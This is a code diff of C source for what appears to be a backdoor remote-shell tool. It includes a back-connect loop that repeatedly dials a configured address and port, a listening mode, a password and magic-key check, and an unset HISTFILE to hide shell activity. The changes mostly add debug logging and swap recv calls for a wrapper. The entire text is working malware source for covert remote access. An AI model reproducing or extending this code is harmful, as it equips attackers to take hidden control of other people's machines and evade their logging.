@@ -106,10 +106,12 @@ int worker(client)
     }
 
     putenv("HISTFILE=");
-    if((ret = wrecv(client, buffer, sizeof(MSG)))<0){
+
+    if((ret = wrecv(client, buffer))<0){
         debuglog("[error] recv(): %s",strerror(errno));
         return 1; 
     }
+    debuglog("GOT HAHA: %d",ret);
 
     pMSG msg = (pMSG)&buffer;
 
@@ -121,9 +123,11 @@ int worker(client)
     debuglog("gen pwd: %s",pwd);
     debuglog("get pwd: %s",msg->pwd);
     if(strncmp((const char *)pwd,msg->pwd,20)!=0){
+        debuglog("Invalid password");
         free(pwd);
         return 1;
     }
+    debuglog("Password accepted");
     free(pwd);
 
     ws.ws_row = msg->ws_row;
@@ -179,7 +183,7 @@ int worker(client)
             }
 
             if( FD_ISSET( client, &rd ) ){
-                if ((ret = recv(client , buffer, BUFSIZ,0)) > 0){
+                if ((ret = wrecv(client , buffer)) > 0){
                     debuglog("recv %d from client fd", ret);
                     pWINCH winch = (pWINCH)buffer;
                     if(winch->flag[0]==magickey[0] && winch->flag[1]==magickey[1] 
@@ -225,13 +229,16 @@ int amcsh_connect(void){
  
     debuglog("About to connect to %s:%s\n", ADDR, PORT);
     while(1){
+        debuglog("About to connect to %s:%s\n", ADDR, PORT);
         server = socket( AF_INET, SOCK_STREAM, 0 );
         if(connect( server, (struct sockaddr *) &server_addr,sizeof( server_addr ) )<0){
             //debuglog("[error] connect(): %s",strerror(errno));
         }
         else{
             worker(server);
+            debuglog("worker exit #1");
             close(server);
+            debuglog("close done");
         }
         sleep(_BACK_CONNECT_INTERVAL);
     }
@@ -265,6 +272,7 @@ int amcsh_listen(void){
     n = sizeof( client_addr );
     while((client = accept( server, (struct sockaddr *)&client_addr, (socklen_t * __restrict__)&n ))){
         worker(client);
+        debuglog("worker exit #2");
         close(client);
     }
     return 0;
